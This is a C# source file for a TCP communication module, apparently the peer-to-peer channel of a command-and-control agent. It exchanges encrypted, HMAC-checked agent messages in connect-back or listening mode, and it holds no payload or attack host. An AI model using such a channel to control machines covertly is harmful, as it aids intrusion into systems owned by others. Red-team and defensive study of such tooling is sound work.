using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

class TcpCommModule : ICommModule
{
    ModuleMode Mode;
    ModuleStatus ModuleStatus;

    TcpListener Listener;

    string Hostname;
    int Port;

    ConfigController Config;
    CryptoController Crypto;
    AgentMetadata Metadata;

    Queue<AgentMessage> Inbound = new Queue<AgentMessage>();
    Queue<AgentMessage> Outbound = new Queue<AgentMessage>();

    ManualResetEvent Status = new ManualResetEvent(false);

    public TcpCommModule(string hostname, int port)
    {
        ModuleStatus = ModuleStatus.Starting;
        Hostname = hostname;
        Port = port;
        Mode = ModuleMode.Client;
    }

    public TcpCommModule(IPAddress address, int port)
    {
        ModuleStatus = ModuleStatus.Starting;
        Listener = new TcpListener(new IPEndPoint(address, port));
        Mode = ModuleMode.Server;
    }

    public ModuleStatus GetStatus()
    {
        return ModuleStatus;
    }

    public void Init(ConfigController config, CryptoController crypto)
    {
        Config = config;
        Crypto = crypto;
    }

    public bool RecvData(out AgentMessage message)
    {
        if (Inbound.Count > 0)
        {
            message = Inbound.Dequeue();
            return true;
        }
        else
        {
            message = null;
            return false;
        }
    }

    public void SendData(AgentMessage message)
    {
        Outbound.Enqueue(message);
    }

    public void SetMetadata(AgentMetadata metadata)
    {
        Metadata = metadata;
    }

    public void Start()
    {
        ModuleStatus = ModuleStatus.Running;

        switch (Mode)
        {
            case ModuleMode.Client:
                StartClient();
                break;
            case ModuleMode.Server:
                StartServer();
                break;
            default:
                break;
        }
    }

    public void Stop()
    {
        switch (Mode)
        {
            case ModuleMode.Client:
                break;
            case ModuleMode.Server:
                Listener.Stop();
                break;
            default:
                break;
        }

        ModuleStatus = ModuleStatus.Stopped;
    }

    private void StartServer()
    {
        Listener.Start();

        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                Status.Reset();
                Listener.BeginAcceptTcpClient(new AsyncCallback(ServerAcceptCallback), Listener);
                Status.WaitOne();
            }
        });
    }

    private void StartClient()
    {
        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                Status.Reset();

                var client = new TcpClient();
                client.BeginConnect(Hostname, Port, new AsyncCallback(ClientConnectCallback), client);
                Status.WaitOne();

                Thread.Sleep(1000);
            }
        });
    }

    #region ServerMethods

    private void ServerAcceptCallback(IAsyncResult ar)
    {
        Status.Set();

        var listener = ar.AsyncState as TcpListener;

        if (ModuleStatus == ModuleStatus.Running)
        {
            var handler = Listener.EndAcceptTcpClient(ar);
            var stream = handler.GetStream();
            var state = new CommStateObject { Worker = stream };

            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ServerReadCallback), state);
        }
    }

    private void ServerReadCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var stream = state.Worker as NetworkStream;

        var bytesRead = 0;

        try
        {
            bytesRead = stream.EndRead(ar);
        }
        catch { }

        if (bytesRead > 0)
        {
            var data = DataJuggle(bytesRead, stream, state);

            if (Crypto.VerifyHMAC(data))
            {
                var inbound = Crypto.Decrypt<AgentMessage>(data);

                if (inbound != null)
                {
                    Inbound.Enqueue(inbound);
                }
            }

            AgentMessage outbound = new AgentMessage { Metadata = Metadata };

            if (Outbound.Count > 0)
            {
                outbound = Outbound.Dequeue();
            }

            var encrypted = Crypto.Encrypt(outbound);
            stream.BeginWrite(encrypted, 0, encrypted.Length, new AsyncCallback(ServerWriteCallback), stream);
        }
    }

    private void ServerWriteCallback(IAsyncResult ar)
    {
        var stream = ar.AsyncState as NetworkStream;

        stream.EndWrite(ar);
        stream.Close();
    }

    #endregion

    #region ClientMethods

    private void ClientConnectCallback(IAsyncResult ar)
    {
        Status.Set();

        var client = ar.AsyncState as TcpClient;

        try
        {
            client.EndConnect(ar);

            var stream = client.GetStream();

            AgentMessage outbound = new AgentMessage { Metadata = Metadata };

            if (Outbound.Count > 0)
            {
                outbound = Outbound.Dequeue();
            }

            var encrypted = Crypto.Encrypt(outbound);
            var state = new CommStateObject { Handler = client, Worker = stream };
            stream.BeginWrite(encrypted, 0, encrypted.Length, new AsyncCallback(ClientWriteCallback), state);
        }
        catch
        {
            // Agent has probably been closed or killed
            ModuleStatus = ModuleStatus.Stopped;
        }
    }

    private void ClientWriteCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var stream = state.Worker as NetworkStream;

        stream.EndWrite(ar);
        stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ClientReadCallback), state);
    }

    private void ClientReadCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var client = state.Handler as TcpClient;
        var stream = state.Worker as NetworkStream;

        var bytesRead = 0;

        try
        {
            bytesRead = stream.EndRead(ar);
        }
        catch { }

        if (bytesRead > 0)
        {
            var data = DataJuggle(bytesRead, stream, state);

            if (Crypto.VerifyHMAC(data))
            {
                var inbound = Crypto.Decrypt<AgentMessage>(data);

                if (inbound != null)
                {
                    Inbound.Enqueue(inbound);
                }
            }
        }

        stream.Close();
        client.Close();
    }

    #endregion

    private byte[] DataJuggle(int bytesRead, NetworkStream stream, CommStateObject state)
    {
        var final = new byte[] { };

        var dataReceived = state.Buffer.TrimBytes();

        if (bytesRead == state.Buffer.Length)
        {
            if (state.SwapBuffer != null)
            {
                var tmp = state.SwapBuffer;
                state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
            }
            else
            {
                state.SwapBuffer = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
            }

            Array.Clear(state.Buffer, 0, state.Buffer.Length);
            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ServerReadCallback), state);
        }
        else
        {
            if (state.SwapBuffer != null)
            {
                final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
            }
            else
            {
                final = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
            }
        }

        return final.TrimBytes();
    }
}